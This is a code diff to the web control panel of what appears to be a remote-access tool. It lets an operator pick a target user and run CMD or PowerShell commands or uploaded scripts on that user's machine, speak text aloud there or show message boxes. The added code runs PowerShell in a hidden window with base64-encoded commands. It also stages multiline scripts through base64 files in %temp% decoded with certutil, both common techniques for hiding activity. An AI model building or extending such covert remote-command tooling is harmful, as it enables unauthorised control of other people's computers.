@@ -348,12 +348,48 @@
             padding: 12px;
             outline: none;
             resize: vertical;
-            margin-bottom: 15px;
+            margin-bottom: 0;
             transition: border-color 160ms ease, box-shadow 160ms ease;
         }
 
         .popup-input:focus {
             border-color: #888;
+        }
+
+        .textarea-wrap {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .tab-hint {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            font-size: 10px;
+            color: #666;
+            pointer-events: none;
+            display: none;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+            font-family: inherit;
+        }
+
+        .tab-hint-row {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            pointer-events: auto;
+            cursor: pointer;
+            border: 0;
+            background: transparent;
+            color: inherit;
+            padding: 0;
+            font: inherit;
+        }
+
+        .textarea-wrap.show-hint .tab-hint {
+            display: flex;
         }
 
         .opt-btn {
@@ -610,7 +646,21 @@
                 <span class="popup-target" id="popup-target-label">TARGET_USER</span>
             </div>
 
-            <textarea class="popup-input" id="popup-input" rows="4" placeholder="Enter payload or text..."></textarea>
+            <div class="textarea-wrap" id="textarea-wrap">
+                <textarea class="popup-input" id="popup-input" rows="6"></textarea>
+                <span class="tab-hint" id="tab-hint">
+                    <button type="button" class="tab-hint-row" id="tab-autofill-hint"><span class="btn-hint">TAB</span> autofill</button>
+                    <button type="button" class="tab-hint-row" id="tab-unfocus-hint"><span class="btn-hint">SHIFT+TAB</span> unfocus</button>
+                </span>
+            </div>
+            <input type="file" id="file-upload" accept=".bat,.cmd,.ps1,.txt" style="display:none;">
+
+            <div id="shell-section" style="display:none;" class="option-row">
+                <button class="opt-btn" id="shell-cmd" tabindex="-1">CMD</button>
+                <button class="opt-btn" id="shell-ps" tabindex="-1">PS</button>
+                <button class="opt-btn" id="cmd-pause" tabindex="-1">Pause</button>
+                <button class="opt-btn" id="upload-btn" tabindex="-1" style="margin-left:auto;">Upload</button>
+            </div>
 
             <div id="vis-section" style="display:none;" class="option-row">
                 <button class="opt-btn" id="vis-true" tabindex="-1">Visible</button>
@@ -646,6 +696,8 @@
             popupUser: null,
             selectedVoice: 'David',
             selectedVis: true,
+            selectedShell: 'cmd',
+            pause: false,
             activeUsername: null,
             interactionMode: null,
             lastRenderSignature: null
@@ -695,11 +747,29 @@
                 .join('||');
         }
 
+        function updatePlaceholder() {
+            const m = state.popupMode;
+            const ta = $('popup-input');
+            if (m === 'cmd') {
+                ta.placeholder = state.selectedShell === 'ps'
+                    ? 'Get-Process | Where-Object { $_.CPU -gt 100 }'
+                    : 'echo hello\nping 127.0.0.1 -n 3';
+            } else if (m === 'speak') {
+                ta.placeholder = 'Text to speak aloud on target...';
+            } else if (m === 'popup_msg') {
+                ta.placeholder = 'Message to display in popup box...';
+            }
+        }
+
         function updateOptionsUI() {
             $('voice-david').className = 'opt-btn' + (state.selectedVoice === 'David' ? ' active' : '');
             $('voice-zira').className = 'opt-btn' + (state.selectedVoice === 'Zira' ? ' active' : '');
             $('vis-true').className = 'opt-btn' + (state.selectedVis ? ' active' : '');
             $('vis-false').className = 'opt-btn' + (!state.selectedVis ? ' active' : '');
+            $('shell-cmd').className = 'opt-btn' + (state.selectedShell === 'cmd' ? ' active' : '');
+            $('shell-ps').className = 'opt-btn' + (state.selectedShell === 'ps' ? ' active' : '');
+            $('cmd-pause').className = 'opt-btn' + (state.pause ? ' active' : '');
+            updatePlaceholder();
         }
 
         function clearActiveSelection() {
@@ -837,28 +907,65 @@
             }
         });
 
+        function syncTabHint() {
+            const taInput = $('popup-input');
+            const taWrap = $('textarea-wrap');
+            const tabAutofillHint = $('tab-autofill-hint');
+            const tabUnfocusHint = $('tab-unfocus-hint');
+            const focused = document.activeElement === taInput;
+            const empty = taInput.value === '';
+            if (focused) {
+                taWrap.classList.add('show-hint');
+            } else {
+                taWrap.classList.remove('show-hint');
+            }
+            tabAutofillHint.style.display = (focused && empty) ? 'flex' : 'none';
+            tabUnfocusHint.style.display = focused ? 'flex' : 'none';
+        }
+
+        function autofillPopupInput() {
+            const taInput = $('popup-input');
+            if (taInput.value !== '') return;
+            taInput.value = taInput.placeholder;
+            taInput.selectionStart = taInput.selectionEnd = taInput.value.length;
+            syncTabHint();
+        }
+
+        function unfocusPopupInput() {
+            $('popup-input').blur();
+            syncTabHint();
+        }
+
         function openPopup(mode, user) {
             state.popupMode = mode;
             state.popupUser = user;
             state.selectedVis = user.visible;
+            state.pause = false;
 
             $('popup-input').value = '';
             $('popup-target-label').textContent = user.username;
             $('popup-overlay').classList.add('open');
+            $('textarea-wrap').classList.remove('show-hint');
 
             $('vis-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
+            $('shell-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
             $('voice-section').style.display = (mode === 'speak') ? 'flex' : 'none';
 
-            if (mode === 'cmd') $('popup-mode-label').textContent = 'Execute Command';
-            else if (mode === 'speak') $('popup-mode-label').textContent = 'Voice Message';
-            else $('popup-mode-label').textContent = 'Message Box';
+            if (mode === 'cmd') {
+                $('popup-mode-label').textContent = 'Execute Command';
+            } else if (mode === 'speak') {
+                $('popup-mode-label').textContent = 'Voice Message';
+            } else {
+                $('popup-mode-label').textContent = 'Message Box';
+            }
 
             updateOptionsUI();
-            setTimeout(() => $('popup-input').focus(), 50);
+            setTimeout(() => { $('popup-input').focus(); syncTabHint(); }, 50);
         }
 
         function closePopup() {
             $('popup-overlay').classList.remove('open');
+            $('textarea-wrap').classList.remove('show-hint');
             state.popupMode = null;
             state.popupUser = null;
         }
@@ -868,6 +975,34 @@
             return escaped.split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
         }
 
+        function wrapPowershell(val) {
+            // UTF-16LE base64 → powershell -EncodedCommand. Handles multiline + any quoting.
+            const utf16 = [];
+            for (let i = 0; i < val.length; i++) {
+                const code = val.charCodeAt(i);
+                utf16.push(code & 0xff, (code >> 8) & 0xff);
+            }
+            const b64 = btoa(String.fromCharCode(...utf16));
+            return `powershell -NoP -W H -EncodedCommand ${b64}`;
+        }
+
+        function applyCommandPause(val) {
+            const input = val.trim();
+            if (!state.pause) return input;
+            if (state.selectedShell === 'ps') {
+                return input ? `${input}\nRead-Host 'Press Enter to continue'` : "Read-Host 'Press Enter to continue'";
+            }
+            return input ? `${input}\npause` : 'pause';
+        }
+
+        function wrapCmd(val) {
+            const isMultiline = val.includes('\n');
+            if (!isMultiline) return val;
+            // Multiline CMD: base64-encode the script, decode to a temp .bat via certutil, run it.
+            const b64 = btoa(unescape(encodeURIComponent(val)));
+            return `cmd /c "echo ${b64}>%temp%\\r.b64 && certutil -decode %temp%\\r.b64 %temp%\\r.bat >nul && cmd /c %temp%\\r.bat && del %temp%\\r.b64 %temp%\\r.bat"`;
+        }
+
         async function doSendPopup() {
             const user = state.popupUser;
             const mode = state.popupMode;
@@ -875,9 +1010,13 @@
             if (!user) return;
 
             let rawCmd = '';
-            if (val) {
-                if (mode === 'cmd') rawCmd = val;
-                else if (mode === 'speak') {
+            if (mode === 'cmd') {
+                const cmdInput = applyCommandPause(val);
+                if (cmdInput) {
+                    rawCmd = state.selectedShell === 'ps' ? wrapPowershell(cmdInput) : wrapCmd(cmdInput);
+                }
+            } else if (val) {
+                if (mode === 'speak') {
                     const msg = formatPSString(val);
                     rawCmd = `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${state.selectedVoice}*'};$s.Speak(${msg})"`;
                 } else {
@@ -951,10 +1090,33 @@
             $('voice-zira').onclick = () => { state.selectedVoice = 'Zira'; updateOptionsUI(); };
             $('vis-true').onclick = () => { state.selectedVis = true; updateOptionsUI(); };
             $('vis-false').onclick = () => { state.selectedVis = false; updateOptionsUI(); };
+            $('shell-cmd').onclick = () => { state.selectedShell = 'cmd'; updateOptionsUI(); };
+            $('shell-ps').onclick = () => { state.selectedShell = 'ps'; updateOptionsUI(); };
+            $('cmd-pause').onclick = () => { state.pause = !state.pause; updateOptionsUI(); };
+
+            $('upload-btn').onclick = () => $('file-upload').click();
+            $('file-upload').onchange = e => {
+                const file = e.target.files[0];
+                if (!file) return;
+                const ext = file.name.split('.').pop().toLowerCase();
+                if (ext === 'ps1') { state.selectedShell = 'ps'; updateOptionsUI(); }
+                else if (ext === 'bat' || ext === 'cmd') { state.selectedShell = 'cmd'; updateOptionsUI(); }
+                const reader = new FileReader();
+                reader.onload = ev => {
+                    $('popup-input').value = ev.target.result;
+                    $('popup-input').focus();
+                };
+                reader.readAsText(file);
+                e.target.value = '';
+            };
 
             document.addEventListener('keydown', e => {
                 if (state.popupMode) {
                     if (e.key === 'Escape') closePopup();
+                    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                        e.preventDefault();
+                        doSendPopup();
+                    }
                     if (e.key === 'Shift' && document.activeElement !== $('popup-input')) {
                         if (state.popupMode === 'speak') {
                             state.selectedVoice = (state.selectedVoice === 'David' ? 'Zira' : 'David');
@@ -1013,8 +1175,41 @@
 
             $('popup-cancel').onclick = closePopup;
             $('popup-confirm').onclick = doSendPopup;
-            $('popup-input').addEventListener('keydown', e => {
-                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) doSendPopup();
+
+            const taInput = $('popup-input');
+            const taWrap = $('textarea-wrap');
+            const tabAutofillHint = $('tab-autofill-hint');
+            const tabUnfocusHint = $('tab-unfocus-hint');
+
+            taInput.addEventListener('focus', syncTabHint);
+            taInput.addEventListener('blur', syncTabHint);
+            taInput.addEventListener('input', syncTabHint);
+
+            tabAutofillHint.addEventListener('mousedown', e => e.preventDefault());
+            tabUnfocusHint.addEventListener('mousedown', e => e.preventDefault());
+            tabAutofillHint.addEventListener('click', () => {
+                taInput.focus();
+                autofillPopupInput();
+            });
+            tabUnfocusHint.addEventListener('click', unfocusPopupInput);
+
+            taInput.addEventListener('keydown', e => {
+                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                    e.preventDefault();
+                    doSendPopup();
+                }
+                if (e.key === 'Tab') {
+                    e.preventDefault();
+                    if (e.shiftKey) {
+                        unfocusPopupInput();
+                    } else if (taInput.value === '') {
+                        autofillPopupInput();
+                    } else {
+                        const s = taInput.selectionStart, end = taInput.selectionEnd;
+                        taInput.value = taInput.value.slice(0, s) + '    ' + taInput.value.slice(end);
+                        taInput.selectionStart = taInput.selectionEnd = s + 4;
+                    }
+                }
             });
         }
         init();
